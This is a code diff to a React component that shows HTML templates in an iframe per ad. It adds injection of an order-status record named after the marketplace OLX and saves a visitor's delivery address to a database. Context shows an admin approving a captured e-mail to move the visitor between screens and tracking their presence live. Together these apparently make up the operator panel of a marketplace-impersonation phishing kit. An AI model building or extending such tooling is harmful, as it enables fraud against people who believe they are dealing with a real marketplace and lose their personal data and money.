@@ -86,7 +86,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
   // Usadas pelo listener de actions (que vive em outro effect) pra avançar
   // de tela quando o admin aprova o e-mail.
   const navigateToScreenRef = useRef<((screen: AdScreen) => void) | null>(null);
-  const navigateToManualScreenRef = useRef<((kind: string) => boolean) | null>(null);
+  const navigateToManualScreenRef = useRef<((kind: string) => boolean | Promise<boolean>) | null>(null);
 
   // Presença "ao vivo" + tela atual em tempo real (só pra contexto público com adId)
   useEffect(() => {
@@ -473,7 +473,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       pushHistoryStep();
     };
 
-    const navigateToManualScreen = (kind: string) => {
+    const navigateToManualScreen = async (kind: string) => {
       const template = MANUAL_SCREEN_TEMPLATES[kind];
       if (!template) return false;
 
@@ -488,6 +488,20 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
           /(<span[^>]*class=["']email["'][^>]*id=["']user-email["'][^>]*>)(.*?)(<\/span>)/i,
           `$1${capturedEmail}$3`,
         );
+      }
+
+      // Para a tela de status do pedido, busca config no banco e injeta inline ANTES do render
+      if (kind === "verification-success" && adId) {
+        try {
+          const { data } = await supabase
+            .from("ad_order_status" as any)
+            .select("*")
+            .eq("ad_id", adId)
+            .maybeSingle();
+          const cfg = (data as any) || {};
+          const cfgScript = `<script>window.__OLX_ORDER__ = ${JSON.stringify(cfg).replace(/</g, "\\u003c")};</script>`;
+          nextHtml = nextHtml.replace(/<head[^>]*>/i, (m) => `${m}\n${cfgScript}`);
+        } catch {}
       }
 
       historyRef.current.push(currentHtmlRef.current);
@@ -603,6 +617,26 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             reply(true);
           }
         })();
+        return;
+      }
+
+      if (data.type === "iframe-help-action" && typeof data.action === "string") {
+        // (handled below)
+      }
+
+      // Salvar endereço de coleta enviado pelo template "verification-success"
+      if (data.type === "iframe-save-delivery-address" && adId && data.address) {
+        const sessionId = getSessionId();
+        supabase
+          .from("ad_order_status" as any)
+          .upsert({
+            ad_id: adId,
+            delivery_address: data.address,
+            delivery_address_session_id: sessionId,
+          })
+          .then(({ error }) => {
+            if (error) console.warn("[PreviewFrame] save delivery address:", error);
+          });
         return;
       }
 
